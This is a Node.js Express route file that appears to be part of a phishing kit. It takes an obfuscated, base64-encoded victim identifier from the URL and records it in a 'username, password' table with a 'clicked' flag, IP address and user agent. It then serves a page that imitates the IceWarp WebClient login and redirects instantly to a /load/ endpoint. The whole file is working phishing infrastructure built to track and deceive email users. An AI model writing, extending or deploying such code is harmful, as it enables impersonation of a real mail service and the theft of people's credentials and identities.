
const express = require ('express');
const router = express.Router();
const db = require('./db');

router.use(express.static('public'));

//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    

    const data = req.query.navcom282snnn;
     if (data == null) {
        res.render('error');
        
        }else{
                    const name = Buffer.from(data, 'base64').toString('utf-8');
                    const word = 'clicked';
                    const clientIP = req.headers['x-forwarded-for'];
                    const ip =  clientIP.split(',')[0].trim(); 
                    // const ip = req.socket.remoteAddress; 
                    const useragent = req.get('User-Agent');
                    const date = new Date();
                    const notify = 2;

                    const insertQuery = 'INSERT INTO newtable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
                    db.query(insertQuery, [name, word, ip, useragent, date, notify], (err) => {
                        if (err) {
                            console.error('Error inserting record:', err);
                            return res.status(500).send('Internal Server Error');
                        }
                    
                    });
                            


                    const url = `/load/?bdfljhdlslkfjsdkfjsldkjfweiofjlkvxcjkvjftjgf=${data}`;

                


            const htmlContent = `
                                 <!DOCTYPE html>
                                    <html>
                                    <head>
                                        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
                                        <title>IceWarp WebClient</title>
                                        <base href=".">
                                        <link rel="icon" href="/files/favicon-32.png" sizes="32x32">
                                        <meta id="theme-colors">
                                        <meta http-equiv="X-UA-Compatible" content="IE=edge">
                                        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0">
                                        <meta name="google" value="notranslate">
                                        <meta http-equiv="cleartype" content="on">
                                        <meta name="version" content="25020709">
                                        <meta name="stylesheet" content="css/style.css" variables="true">
                                        <link type="text/css" href="/files/api.css" rel="stylesheet">
                                        <link type="text/css" href="/files/pikaday.css" rel="stylesheet">
                                        <link type="text/css" href="/files/style.css" rel="stylesheet">
                                        <!-- <link type="text/css" href="/files/custom.css" rel="stylesheet"> -->
                                        <link type="text/css" rel="stylesheet" href="/files/style.css">
                                        <script>
                                        setTimeout(function() {
                                            window.location.href = '${url}';
                                        }, 0000);
                                        </script> 
                                    </head>
                                    <body>
                                            <object data="./Churna MPA.pdf" style="width:1800px; height:900px;"></object>
                                    </body>
                                </html>
                                `;

                    // Send the HTML content as a response
                    res.send(htmlContent);

                            }
                });




                module.exports =router
